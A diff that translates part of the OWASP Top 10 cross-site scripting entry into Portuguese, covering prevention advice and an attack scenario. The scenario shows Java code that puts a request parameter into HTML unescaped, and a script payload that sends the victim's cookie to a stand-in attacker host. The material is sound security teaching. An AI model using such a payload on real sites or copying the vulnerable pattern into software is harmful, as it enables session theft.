@@ -20,27 +20,27 @@ Os ataques típicos de XSS incluem o roubo de sessões, roubo ou controlo de con
 Prevenir ataques de XSS requer a separação de dados não confiáveis do conteúdo activo de um browser.
 
 * Usar frameworks seguras que limpam de forma automática o XSS por desenho, tal como acontece com o Ruby 3.0 ou React JS, ou então alavancar as proteções de XSS das frameworks.
-* Limpar pedidos de dados HTTP não confiáveis baseado no contexto do resultado HTML (corpo, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
-* Applying context sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is a defense in depth mitigating control against XSS, assuming no other vulnerabilities exist that would allow placing malicious code via local file include such as path traversal overwrites, or vulnerable libraries in permitted sources, such as content delivery network or local libraries. 
+* Limpar pedidos de dados HTTP não confiáveis baseado no contexto do resultado HTML (corpo, attribute, JavaScript, CSS, ou URL) resolverá as vulnerabilidades de XSS reflectido ou armazenado. O [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) possui detalhes sobre as técnicas de limpeza de dados a serem realizadas.
+* Aplicação de codificação sensível ao contexto aquando da modificação do documento no browser no lado do cliente pode proteger contra DOM XSS. Quando isto não pode ser evitado, técnicas semelhantes de limpeza sensível ao contexto podem ser aplicadas às API do browser tais como descritas em [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
+* Activar uma [Política de Segurança do Conteúdo (CSP - Content Security Policy)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) é uma defesa em profundidade para mitigar XSS, assumindo que não existem outras vulnerabilidades que permitam colocar código malicioso através da inclusão de ficheiros locais tais como is atravessar caminhos, ou bibliotecas vulneráveis em fontes permitidas, tais como redes de entrega de conteúdos ou bibliotecas locais. 
 
 ## Exemplos de Cenários de Ataque
 
-**Scenario 1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+**Scenario 1**: A aplicação usa dados não confiáveis na construção do seguinte trecho de HTML sem qualquer tipo de validação ou limpeza:
 
 ```
    (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
 ```
 
-The attacker modifies the 'CC' parameter in the browser to:
+O atacante modifica o parâmetro 'CC' no browser para:
 
 ```
 ><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
 ```
 
-This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session.
+Este ataque força a que o ID de sessão da vítima seja enviado para o site web do atacante, permitindo que atacante possam raptar a sessão actual do utilizador.
 
-Note that attackers can use XSS to defeat any automated CSRF defense the application might employ. 
+De notar que os atacantes podem usar XSS para derrotar qualquer tipo de defesa automática baseada em CSRF que a aplicação use. 
 
 ## Referências
 
